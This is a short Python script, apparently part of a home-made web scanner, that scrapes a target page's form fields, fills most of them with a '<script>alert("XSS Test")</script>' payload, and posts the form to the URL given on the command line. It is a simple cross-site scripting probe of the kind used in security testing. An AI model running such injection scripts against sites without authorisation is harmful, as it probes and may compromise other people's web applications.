import sys
import requests
import webpkg.sqlinjection.send_getpacket
import webpkg.regex
import webpkg.parser

# This code does not work on a secure website
# First Check
#   have to exist <input> tag in the input value

def makeXssdict(url):

    soup = webpkg.parser.getsoup(url)

    input = soup.select('form input[type=text]')
    pw = soup.select('form input[type=password]')[0]['name']
    print("Input tag : " + str(len(input)))

    # Dictionary key value
    dict = {}
    count = 0
    xss = "XSS Test"
    xssscript = "<script>alert(\"XSS Test\");</script>"
    while(count != len(input)):
        print(input[count]['name'])
        if count == 0: # almost title
            dict[input[count]['name']] = xss
        else:
            s = webpkg.regex.findstringSearch("name|user", input[count]['name'])
            if s != None: # search
                dict[input[count]['name']] = xss
            else: # not search
                dict[input[count]['name']] = xssscript
        count += 1
    dict[pw] = xss

    print(pw + "\nInput tag list : " + str(dict))
    return dict

url = str(sys.argv[1])
dict = makeXssdict(url)

action_page, id_value, pw_value = webpkg.sqlinjection.send_getpacket.getValues(url)
domain, middle, next_url, topost = webpkg.sqlinjection.send_getpacket.getDomain(url, action_page)

# Send post packet
resp = requests.post(next_url, data=dict)
print("\n[[[[[ RESPONSE ]]]]]\n" + resp.text)
